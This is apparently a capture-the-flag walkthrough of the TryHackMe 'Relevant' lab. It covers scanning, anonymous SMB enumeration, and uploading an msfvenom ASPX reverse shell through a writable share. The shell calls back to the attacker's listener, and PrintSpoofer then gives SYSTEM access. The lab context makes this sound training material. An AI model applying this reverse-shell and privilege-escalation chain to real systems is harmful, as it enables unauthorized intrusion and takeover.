This is a walkthrough for the [TryHackMe][thm] room: [Relevant][relevant]. Let’s get started!

# Overview
This room is laid out about as similar to a real-world pentest that a THM room can be. It comes with a Scope of Work (SOW) that you need to read through and follow. As the room states, it would be beneficial to treat this as a real pentest, and write a report on it. I won’t be doing that in this walkthrough, but I will do that on my own. I may post the report in a separate posting.

# User Flag
Since this is a black box test, let’s start with `rustscan`. This tool can be found [here][rustscan]. This tool will first scan the server, then pass the open ports into `nmap` for output.

Command: `rustscan -a <machine_ip> -- -A -Pn`

![r1](/assets/images/thm/relevant/r1-1.png)

As you can see, we have a web-server, SMB, and RDP ports open on this box. We also see 49663 port open with an IIS service.. We have a possible OS of Windows Server 2016 SE 14393.

Let’s checkout the port 80 web-server first!

![r2](/assets/images/thm/relevant/r2.webp)

We are met by an extremely blue default Windows IIS page. `nmap` gave a version of `httpd 10.0` that we can research exploits on. SMB also seems like a good route to go. Let’s enumerate smb with `smbclient`. This tool should be pre-installed on your Kali instance. If not, run `sudo apt install smbclient`

Let’s run it with this command:

`smbclient -L \\\\<machine_ip>`

Just press **Enter** when prompted for a password

![r3](/assets/images/thm/relevant/r3.png)

We can see there are a few directories listed. Can we connect to any? We can connect to `IPC$` with `smbclient \\\\<machine_ip>\\IPC$`. However, we get the following error:

`NT_STATUS_INVALID_INFO_CLASS listing \*`

Let’s try the last one: `nt4wrksv`

Success! `ls` the directory and we see `passwords.txt`

![r4](/assets/images/thm/relevant/r4.png)

Let’s view the file. `get passwords.txt`

Now we have 2 encoded passwords. Let’s decode them! Head to [base64decode.org][base64] to decode both of the strings.

Now, we have 2 usernames and passwords. You may have tried to login, enumerate more, etc with these 2 usernames and passwords. Well, this is what we call a **honeypot**. This was put in place by the creator of the room to trick us and waste our time. Job well done! This is a dead end.

Let’s go back to other options of getting in. We haven’t checked out the website, other than visiting it. Let’s enumerate directories!

`dirsearch -u http://<machine_ip> -E -x 400,500 -r -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

We didn’t find anything there. Let’s try the webserver on port 49663. Same default page, but what about a dirsearch?

![r9](/assets/images/thm/relevant/r9.webp)

Looks like there is a directory with the same name as the smb share that we found earlier. Let’s see if it is connected to the share we were in.

![r5](/assets/images/thm/relevant/r5.png)

This is good! Now, can we upload files? In a terminal, connect to the smb share and try to upload a file. `put file.txt`

![r6](/assets/images/thm/relevant/r6.png)

SUCCESS! Alright, now how can we exploit this? Let’s craft a payload with `msfvenom`!

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<thm_ip> LPORT=1234 -f aspx -o shell.aspx
```

Now upload the file to the SMB client. Start a `netcat` listener: `nc -lvnp 1234`. Now curl the file: `curl http://<machine_ip>/nt4wrksv/shell.aspx`

![r7](/assets/images/thm/relevant/r7.png)

Now navigate to a user folder to get the `user.txt` flag.

![r8](/assets/images/thm/relevant/r8.png)

#Root Flag
Now we need to find a way to do privilege escalation on this machine. Let’s start by going through our permissions. I like to follow this [Checklist][payloads].

When you run: `whoami /priv` we find something interesting.

![r11](/assets/images/thm/relevant/r11.png)

I found this [write-up][printspoof-w]. Let’s try this exploit! Exploit can be found [here][printspoof-e]. However, we need this to be compiled. You can compile this yourself, or just download the .exe [here][comp-print].

Get the file onto the system and then run: `PrintSpoofer.exe -i -c cmd`

![r12](/assets/images/thm/relevant/r12.png)

Now get the root flag!

# Review
I thought this was an excellent room. It tested my skills and even caught me with that wonderful honeypot! I thought the creator of the room did a great job at keeping the room interesting and not having the normal points of entry!
